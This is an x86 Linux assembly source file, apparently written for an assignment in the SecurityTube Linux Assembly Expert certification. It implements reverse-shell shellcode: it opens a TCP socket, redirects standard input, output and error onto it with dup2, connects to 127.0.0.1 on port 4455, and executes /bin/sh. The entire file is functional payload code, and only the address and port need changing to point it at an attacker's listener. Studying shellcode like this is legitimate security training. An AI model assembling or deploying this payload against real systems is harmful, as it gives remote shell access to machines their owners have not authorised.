; Filename:	reverseshell.nasm
; Author:	aus-mate
; Purpose:	This code was written for assignment #2 of the SecurityTube Linux Assembly Expert certification.
; Student ID:	SLAE-1555

global _start

section .text

_start:
	; syscalls: cat /usr/include/i386-linux-gnu/asm/unistd_32.h
	
	; socketcall(int call, unsigned long *args)
	xor eax, eax		; clear eax
	mov al, 0x66		; syscall socketcall 
	xor ebx, ebx		; clear ebx
	mov bl, 0x1		; sys_socket = 1
	
	; prepare arguments
	xor ecx, ecx 		; clear ecx
	push ecx		; push 0 onto the stack, 0 = IPPROTO_TCP 
	push 0x1		; push 1 onto the stack, 1 = SOCK_STREAM 
	push 0x2		; push 2 onto the stack, 2 = AF_INET
	mov ecx, esp		; point the ecx register to the argument array

	int 0x80		; execute syscall
	
	mov ebx, eax		; store return value in ebx 
	
	xor ecx, ecx		; clear ecx
	mov cl, 0x3		; move 3 into ecx for loop operation
	mov esi, 0xfffffffd	; move -3 into esi
dup:
        ; dup2(oldfd, newfd)
        push ecx		; push ecx onto the stack
        xor eax, eax		; clear eax
	add ecx, esi		; alter ecx to desired value on each loop (0, 1, 2)
        mov al, 0x3f            ; syscall dup2
        int 0x80                ; execute syscall
	add esi, 0x2 		; add 2 to esi for ecx calculation
        pop ecx			; return the previous value of ecx
        loop dup		; loop

	mov esi, ebx 		; store value of ebx (sockfd)

	; socketcall(int call, unsigned long *args)
	xor eax, eax		; clear eax
	mov al, 0x66		; syscall socketcall
	xor ebx, ebx		; clear ebx
	mov bl, 0x3		; sys_connect = 3
	
	; prepare struct
	xor edx, edx
	push 0x0100007f		; in_add = 127.0.0.1
	push word 0x6711	; port (4455) in network byte order
	push word 0x2		; AF_INET
	mov edx, esp		; pointer to struct

	; prepare arguments
	push 0x10		; addrlen = 16
	push edx		; pointer to struct
	push esi		; sockfd
	mov ecx, esp		; set pointer to arguments
	
	int 0x80		; execute syscall

	; execve
	xor eax, eax		; clear eax
	push eax		; push 0s into the stack - to use as null terminator
	mov al, 0xb		; syscall execve
	push 0x68732f2f		; /bin//sh
	push 0x6e69622f
	mov ebx, esp		; set pointer to /bin//sh
	xor ecx, ecx		; null argv
	xor edx, edx		; clear edx
	int 0x80		; execute syscall

